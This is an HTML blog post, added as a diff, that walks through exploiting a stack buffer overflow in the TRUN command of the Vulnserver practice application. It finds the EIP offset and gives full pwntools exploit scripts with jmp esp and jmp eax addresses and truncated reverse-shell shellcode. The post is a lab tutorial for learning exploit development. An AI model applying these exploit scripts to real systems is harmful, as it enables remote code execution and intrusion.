@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+<meta content="text/html; charset=UTF-8" http-equiv="content-type" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+<meta name="robots" content="index, follow">
+
+
+
+
+
+
+
+
+
+
+<title>Vulnserver: Buffer overflow in TRUN command</title>
+
+
+
+<meta name="title" content="Vulnserver: Buffer overflow in TRUN command">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://guas.ch/blog/vulnserver2-trun/">
+
+<meta property="og:site_name" content="">
+
+
+<meta property="og:title" content="Vulnserver: Buffer overflow in TRUN command">
+
+
+
+
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://guas.ch/blog/vulnserver2-trun/">
+
+<meta property="twitter:title" content="Vulnserver: Buffer overflow in TRUN command">
+
+
+
+
+<link rel="canonical" href="https://guas.ch/blog/vulnserver2-trun/">
+
+
+
+
+<link rel="alternate" type="application/atom+xml" title="RSS" href="https://guas.ch/atom.xml"> 
+
+
+
+<link rel="stylesheet" href="https://guas.ch/css/style.css" />
+
+<script defer>
+    const setTheme = (theme) => {
+        document.documentElement.className = theme;
+        localStorage.setItem('theme', theme);
+    }
+
+    const hasCodeRun = localStorage.getItem('hasCodeRun');
+
+    if (!hasCodeRun) {
+        const defaultTheme = "light";
+        setTheme(defaultTheme);
+        localStorage.setItem('hasCodeRun', 'true');
+    }
+
+    const getTheme = () => {
+        const theme = localStorage.getItem('theme');
+        if (theme) {
+            setTheme(theme);
+        }
+    }
+
+    getTheme();
+
+</script>
+</head>
+<body>
+    <div class="wrapper">
+      <header>
+          
+
+  
+
+
+  <nav class="navBar">
+    
+      <a href="&#x2F;" class="">
+        
+        &#x2F;whoami&#x2F;
+      </a>
+    
+      <a href="&#x2F;blog" class="">
+        
+        &#x2F;blog&#x2F;
+      </a>
+    
+
+  <div class="themeSwitch">
+    
+    <button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"> <use href="https://guas.ch/icons.svg#lightMode"></use></svg></button>
+    <button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#darkMode"></use></svg></button>
+
+    
+  </div>
+</nav>
+
+
+      </header>
+      <main>
+          
+<div><a href="..">..</a>/<span class="metaData">vulnserver2-trun</span></div>
+<time datetime="2019-08-02">Published on: <span class="metaData">2019-08-02</span></time>
+
+<h1>Vulnserver: Buffer overflow in TRUN command</h1>
+
+
+
+<p>In this post we are going to analyze the crash we found previously in the TRUN command of Vulnserver by using our fuzzer. And we are also going to look at different ways of exploiting it.<!--more--></p>
+<h1 id="analyzing-the-crash">Analyzing the crash</h1>
+<p>As a reminder, the registers in Immunity Debugger looked like in the image below after the crash.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg1.PNG">
+    <img src="img&#x2F;immunitydbg1.PNG" >
+  </a>
+  
+</div>
+<p>From that we can see that we probably control EIP and we can also obtain the string we send to the application from the EAX register. So if we extract the string we obtain the following:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">TRUN</span><span> /.:/AAAAAAAAAAAAAAAAAAA... </span><span style="color:#65737e;"># There&#39;s supposed to be 5000 As here
+</span></code></pre>
+<p>Our next step is going to be what is the offset in which we overwrite EIP so that we can control it properly. To do that we will use python and <a href="https://github.com/Gallopsled/pwntools">pwntools</a>, a python library that will help us in exploit development. We can simply install it by running <strong>pip install pwntools</strong> in the terminal in our Kali VM and we can check if it's intalled correctly simply by running <strong>pwn update</strong>.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;pwntools1.PNG">
+    <img src="img&#x2F;pwntools1.PNG" >
+  </a>
+  
+</div>
+<p>To get the offset of EIP we are going to substitute the sequence of 5000 As with a de Bruijn sequence which we will generate by using pwntools by running <strong>pwn cyclic 5000</strong> in the terminal. We can copy the output and then give it to Vulnserver manually by using netcat, make sure you are debugging the application with Immunity Debugger so that we cna analyze the crash.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;vulnserver1.PNG">
+    <img src="img&#x2F;vulnserver1.PNG" >
+  </a>
+  
+</div>
+<p>Now if we look at the debugger there's a crash and in the Registers window we can see that now EIP is equal to 61616275, this number is part of our de Bruijn sequence but its represented in hexadecimal. To obtain its position in the sequence we can use pwntools again by running <strong>pwn cyclic -l 0x61616275</strong>, we appended <em>0x</em> to the beginning of our number to signal its in hex.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg2.PNG">
+    <img src="img&#x2F;immunitydbg2.PNG" >
+  </a>
+  
+</div><div class="textCenter">
+  <a class="lightbox" href="img&#x2F;pwntools2.PNG">
+    <img src="img&#x2F;pwntools2.PNG" >
+  </a>
+  
+</div>
+<p>Now that we know our offset is 2003 let's test it by changing EIP to something easy to spot like 0xcafebabe. To make our job easier let's write a script in python using pwntools that connects to Vulnserver and sends the command.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">192.168.1.46</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999 
+</span><span>
+</span><span style="color:#65737e;"># Define the variables with the data we obtained.
+</span><span>cmd = &quot;</span><span style="color:#a3be8c;">TRUN /.:/</span><span>&quot; </span><span style="color:#65737e;"># Command used and start of payload.
+</span><span>offset_eip = </span><span style="color:#d08770;">2003 </span><span>+ </span><span style="color:#96b5b4;">len</span><span>(cmd)
+</span><span>eip = </span><span style="color:#d08770;">0xcafebabe </span><span style="color:#65737e;"># Address we want to overwrite EIP with.
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd,
+</span><span>    offset_eip:eip,
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">5000</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># Connect to the target and send the payload.
+</span><span>io = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>Once we execute this script with python we produce a crash and if we check the debugger we can see that the EIP overwrite has worked corretly.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg3.PNG">
+    <img src="img&#x2F;immunitydbg3.PNG" >
+  </a>
+  
+</div><h1 id="exploiting">Exploiting</h1>
+<p>So finally it's time to start the fun part, executing whatever code we want in the victim. First we have to think where can we write the code we want to execute and how to move the execution to it. And in this case we have two options that we can see in the screen above, EAX which points to the beginning of our string or ESP which points to &quot;aauf...&quot; which if we check with <strong>pwn cyclic -l aauf</strong> is at offset 2017.</p>
+<h2 id="using-esp">Using ESP</h2>
+<p>Let's start with the option of using ESP since it's a bit easier, to do that we need to write our shellcode in the offset where ESP is pointing at and find an address in Vulnserver's execution that points to a jmp esp instruction. To achieve the later we can use the plugin mona.py in Immunity Debugger with the command <strong>!mona jmp -r esp</strong> and it will show us in the log all the different addresses we can use.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg3.PNG">
+    <img src="img&#x2F;immunitydbg3.PNG" >
+  </a>
+  
+</div>
+<p>So let's choose one of those addresses, for example 0x625011af and know we need to find some shellcode to execute, we can look for something on the internet like for example in <a href="http://shell-storm.org/shellcode/">shell-storm</a> or even better we can create our own with the metasploit tool msfvenom.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;msfvenom1.PNG">
+    <img src="img&#x2F;msfvenom1.PNG" >
+  </a>
+  
+</div>
+<p>Now what's left is simply putting together all the different parts which we can see in the code below.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">192.168.1.46</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999 
+</span><span>
+</span><span style="color:#65737e;"># Define the variables with the data we obtained.
+</span><span>cmd = &quot;</span><span style="color:#a3be8c;">TRUN /.:/</span><span>&quot; </span><span style="color:#65737e;"># Command used and start of payload.
+</span><span>offset_eip = </span><span style="color:#d08770;">2003 </span><span>+ </span><span style="color:#96b5b4;">len</span><span>(cmd)
+</span><span>eip = </span><span style="color:#d08770;">0x625011af </span><span style="color:#65737e;"># Address we want to overwrite EIP with, jmp esp in this case.
+</span><span>
+</span><span style="color:#65737e;"># Here we put the shellcode we want to execute.
+</span><span>offset_sc = </span><span style="color:#d08770;">2017 </span><span style="color:#65737e;"># Offset of ESP.
+</span><span>shellcode =  &quot;</span><span style="color:#96b5b4;">\x90</span><span>&quot;*</span><span style="color:#d08770;">15 </span><span style="color:#65737e;"># NOP sled for conflicts with the shellcode using the stack.
+</span><span>shellcode += &quot;</span><span style="color:#96b5b4;">\xda\xc7\xb8\x19\xda\x3b\xc4\xd9\x74\x24\xf4\x5b</span><span>&quot;
+</span><span>shellcode += &quot;</span><span style="color:#96b5b4;">\x2b\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xda</span><span>&quot;
+</span><span style="color:#65737e;"># ... shellcode keeps going but it&#39;s cut for brevity.
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd,
+</span><span>    offset_eip:eip,
+</span><span>    offset_sc:shellcode,
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">5000</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># Connect to the target and send the payload.
+</span><span>io = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>After that we can set up a listener with netcat in port 4444 in our Kali VM and execute the python script. If you did everything correctly you should be able to see the following:</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;pwned1.PNG">
+    <img src="img&#x2F;pwned1.PNG" >
+  </a>
+  
+</div><h2 id="using-eax">Using EAX</h2>
+<p>This case is really similar to using ESP but we have to take into account that it's pointing to the beginning of the string and we can't modify the &quot;TRUN /.:/&quot; part since it's the one that runs the command. We need to find a jmp eax plus a value bigger than 9 or we also have another option, if we treat &quot;TRUN /.:/&quot;, <em>54 52 55 4e 20 2f 2e 3a 2f</em> in hex, as instructructions, we can see that they don't actually modify the flow of our shellcode. We can disassemble them using the coommand <strong>pwn disasm 54 52 55 4e 20 2f 2e 3a 2f</strong>.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;pwntools3.PNG">
+    <img src="img&#x2F;pwntools3.PNG" >
+  </a>
+  
+</div>
+<p>So we just need to modify our previous code with the necessary offsets and addresses we obtain like in the previous method and our script will look something like this:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">192.168.1.45</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999 
+</span><span>
+</span><span style="color:#65737e;"># Define the variables with the data we obtained.
+</span><span>cmd = &quot;</span><span style="color:#a3be8c;">TRUN /.:/</span><span>&quot; </span><span style="color:#65737e;"># Command used and start of payload.
+</span><span>offset_eip = </span><span style="color:#d08770;">2003 </span><span>+ </span><span style="color:#96b5b4;">len</span><span>(cmd)
+</span><span>eip = </span><span style="color:#d08770;">0x625011b1 </span><span style="color:#65737e;"># Address we want to overwrite EIP with, jmp eax in this case.
+</span><span>
+</span><span style="color:#65737e;"># Here we put the shellcode we want to execute.
+</span><span>shellcode =  &quot;</span><span style="color:#96b5b4;">\x90</span><span>&quot;*</span><span style="color:#d08770;">16 </span><span style="color:#65737e;"># NOP sled for safety.
+</span><span>shellcode += &quot;</span><span style="color:#96b5b4;">\x89\xC4\x83\xEC\x7C</span><span>&quot; </span><span style="color:#65737e;"># mov esp,eax; sub esp,0x7c
+</span><span>shellcode += &quot;</span><span style="color:#96b5b4;">\xda\xc7\xb8\x19\xda\x3b\xc4\xd9\x74\x24\xf4\x5b</span><span>&quot;
+</span><span>shellcode += &quot;</span><span style="color:#96b5b4;">\x2b\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xda</span><span>&quot;
+</span><span style="color:#65737e;"># ... shellcode keeps going but it&#39;s cut for brevity.
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd + shellcode,
+</span><span>    offset_eip:eip,
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">5000</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># Connect to the target and send the payload.
+</span><span>io = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>A really important point to make is that we added the instructions <strong>mov esp,eax; sub esp,0x7c</strong> to the beginning of our shellcode so that we don't get our shellcode overwriten when it uses the stack, the value <em>0x7c</em> is really important since it has to be a multiple of 4 to keep the stack aligned or some library calls will produce an error.</p>
+<p>And that's it guys, see you in the next post!</p>
+
+
+<p class="tagsData">
+  
+</p>
+
+      </main>
+      <footer>
+          <hr>
+<div class=footContainer>
+  <div class="footLeft">
+      Built with <a target="_blank" rel="noopener noreferrer" href="https://www.getzola.org">Zola</a> using <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/anemone">anemone</a> theme &amp; <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/veqev">veqev</a> colors.<br>
+    </p>
+  </div>
+  
+  <div class="footRight">
+    <a class="icons__background" target="_blank" rel="noopener noreferrer" href="https://guas.ch/atom.xml" title="Subscribe via RSS for updates."><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#rss"></use></svg></a>
+  </div>
+  
+</div>
+      </footer>
+    </div>
+</body>
+</html>
